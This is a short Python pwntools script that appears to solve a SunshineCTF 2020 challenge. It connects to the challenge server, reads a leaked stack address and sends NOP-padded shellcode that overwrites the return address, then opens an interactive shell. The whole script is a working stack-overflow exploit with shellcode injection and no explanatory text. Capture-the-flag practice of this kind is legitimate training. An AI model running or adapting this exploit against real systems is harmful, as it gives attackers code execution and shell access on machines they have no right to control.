from pwn import *

context.arch = 'amd64'

sh = remote('chal.2020.sunshinectf.org', 30003)
# sh = process('./chall_03')

p1 = "A" * 13

sh.recvline()
sh.sendline(p1)

s = sh.recvline().decode('ascii').split()
rsp_str = s[-1]
rsp = int(rsp_str, 0)
print(hex(rsp))

ret_addr_padding = 120
payload = asm(shellcraft.sh()).ljust(ret_addr_padding, asm('nop'))
print(len(payload))
payload += p64(rsp)

# with open('payload', 'w') as f:
#     f.write(p1 + '\n')

# with open('payload', 'ab') as f:
#     f.write(payload)

sh.sendline(payload)
sh.interactive()
